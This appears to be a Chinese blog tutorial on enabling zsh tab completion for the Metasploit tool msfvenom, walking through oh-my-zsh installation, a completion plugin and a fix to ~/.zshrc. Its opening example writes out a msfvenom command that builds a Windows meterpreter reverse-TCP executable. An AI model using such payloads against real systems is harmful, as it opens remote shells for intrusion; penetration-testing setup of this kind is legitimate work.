**0X00 背景：**  
msfvenom大家都不陌生，在我们使用MSF进行权限维持，内网渗透的时候都会用到，支持的语言的种类很多。大家都知道我们在使用msfvenom 的时候需要手动输入很多参数，这些参数需要记忆，或记在其它地方，用的时候在查看使用哪个参数，哪条命令，非常的不方便。  
比如：我要生成一个 32 位 exe 的 payload，命令为：  
msfvenom   

\-p windows/meterpreter/reverse\_tcp   

LHOST=1.1.1.1 LPORT=1234 -f exe -o /home/a.exe  
全靠手一个字一个字输入啊，这还不算 -a -e -i -x 等参数，而且每个参数选项也非常多，这得记多少东西。  

![](../Images/198279697e4a7c90ddb9a67a6ebc0dd5.png)

偶然看到亮神写的一篇“解决 msfvenom 命令自动补全”文章，心想，还有这操作？  
  

![](../Images/a0e174ee1e9e3200f98b5aacc0686ffd.png)

瞬间感觉走上了人生巅峰

注：亮神给的文档并不是按照一步一步写的，更像是笔记，所以有些内容不全，按照他给的操作是不成功的， 而按照官方给的操作也没有做成功。问题到底出现在哪里？下面附上我整个的操作步骤！

  

**0X01 实验环境：**  
操作系统：ubuntu16.04  

![](../Images/90dd3dc48abf9f895595b2fb152c3c56.png)

部署软件：metasploit5.0

![](../Images/c7514b45874ccca9b48f7ebf5078e028.png)

  

**0X02 安装 oh-my-zsh**  
命令补全功能要借助 oh-my-zsh 软件，官装方法，找个适合自己的就可以， 官网地址：https://ohmyz.sh/  
因为我是 ubuntu 系统，我选择安装   

sh -c "$(wget https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)"

![](../Images/933e287c6a2cb579838137e98bd1caa3.png)

What？ 报错了，原来需要依赖 zsh，使用 apt-get install zsh 安装  

![](../Images/4883b83fa46e430db4e4e36c8973ff5d.png)

安装完成后，再安装 oh-my-zsh

![](../Images/1a40c8097153971e0f3e93ca3dc0343b.png)

![](../Images/df30c9cb5883eddb6d8141e67b74f211.png)

出来此界面说明安装成功！

  

**0X03 安装自动补全脚本**  
输入： git clone https://github.com/Green-m/msfvenom-zsh-completion ~/.oh-my-zsh/custom/plugins/msfvenom/

![](../Images/37df7892e2070e5658072daf87a3c496.png)

查看是否已下载\_msfvenom 文件

![](../Images/5f8c5b53a34a0806c2ab36df721c7e17.png)

使用 nano 命令打开 ~/.zshrc 文件 nano~/.zshrc 找到 plugins=(git) 将 msfvenom 添加到里面 plugins=(gitmsfvenom)  

![](../Images/bfd10b0150590ff3a1b42157704de3e7.png)

保存，退出 执行 source~/.zshrc 或 zsh 命令。  
按照以上的操作应该就能实现了，此步骤也是官方给出的步骤，但是实际操作后，并不能补全命令

![](../Images/a7d0f092cad2e092aed69845738fcab8.png)

按 tab 键没有任何反应，说明失败。

  

**0X04 解决方法**  
我也是经过了很长时间才找到解决方法的，是我无意中看见关于 docker 命令补全方法, 其中多出了两条命令，我拿过来一试，成功了，尼玛，意不意外，惊不惊喜？

![](../Images/e94ab68f7aa987ad4aa80be748b29a4d.png)

到底是哪两条命令呢 ，官方解释  
fpath=(~/.zsh/completion$fpath) （$fpath 通过添加来包含您的目录~/.zshrc） autoload-Uzcompinit&&compinit-i （确保 compinit 已加载或通过添加~/.zshrc）   

将这两条命令加到 ~/.zshrc 最后一行

![](../Images/df373355ae91a1c12046abca1073c8a2.png)

保存退出，zsh 一下，输入 msfvenom- 按 tab 键，奇迹出现了

![](../Images/3b9ec0f8eceb08d2279263ea791be658.png)

感受一下

![](../Images/1800eb03e44dcf3b4175c0a43cc69841.png)

![](../Images/57c3bc470f62ed9db066981bd0bdc1e5.png)

![](../Images/9064021560f1fcb391255b766d4a5dfe.png)

![](../Images/13f8a72888c777ba11b342458119c2d8.png)

是不是很爽，都不需要看文档，直接输出，很方便。
